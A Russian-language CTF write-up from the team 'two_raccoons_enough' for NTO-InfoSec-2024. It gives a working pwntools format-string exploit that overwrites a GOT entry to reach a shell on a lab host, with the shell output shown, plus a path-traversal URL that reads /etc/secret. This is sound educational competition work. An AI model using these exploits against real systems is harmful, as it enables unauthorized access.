# NTO-InfoSec-2024-writeups
# Команда "two_raccoons_enough"
____
# Task based
## PWN
### 10 баллов
Залив исходники в дизассемблер, мы можем заметить функцию `win()`, которая возвращает  `/bin/sh`, способный дать нам контроль над машиной. В функции `main()` содержится memory unsafe `printf(format: &var_418)`, уязвимая к f-strings. 
```shell
┌──(kali㉿KaliOlymp)-[~/Downloads]
└─$ nc 192.168.12.13 1923        
%x %x %x %x
78252078 fbad2088 15a62ac 0
```
Проверив эту гипотезу, мы приступили к редактированию кода, который использовался в райтапах на подобную задачу, [найденного на CTFTime](https://ctftime.org/writeup/33272).
```python
from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('ubume.crewctf-2022.crewc.tf', 1337)
    else:
        return process(e.path)

p = start()

payload_writes = {
        e.got['exit']: e.sym['win']
}

payload = fmtstr_payload(6,payload_writes,write_size='short')
p.sendline(payload)
p.interactive()
```
Этот код не работал и не совсем подходил для нашего таска, поэтому пришлось его отредактировать
```python
from pwn import *


binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF("/home/kali/Desktop/main")
r = ROP(e)

gs = '''
continue
'''

def start():
    return remote('192.168.12.13', 1923)

p = start()

payload_writes = {
        e.got['exit']: e.sym['win']
}

payload = fmtstr_payload(6,payload_writes,write_size='short')
p.sendline(payload)
p.interactive()
```
Эксплоит успешно передал управление функции `win()`, которая дала нам полный доступ к уязвимой машине
```shell
┌──(kali㉿KaliOlymp)-[~/Desktop]
└─$ python exploit.py -h ./main
[*] '/home/kali/Desktop/main'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loaded 4 cached gadgets for '/home/kali/Desktop/main'
[+] Opening connection to 192.168.12.13 on port 1923: Done
[*] Switching to interactive mode
```
```shell
$ ls
bin
boot
dev
etc
flag
home
lib
lib32
lib64
libx32
main
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
$ cat flag
nto{easy_formt_string}
$  
```
Мы получили флаг: **nto{easy_formt_string}**
## Web 
### 10 баллов
На сайте мы сразу же видим число 20, на которое можно нажать. Нажав мы видим `Hint_1 maybe in etc/secret ???`.
Это явный намёк на LFI. Просто меняем путь в строке на http://192.168.12.10:5001/download?file_type=../../../../etc/secret и получаем флаг.
**nto{P6t9_T77v6RsA1}**
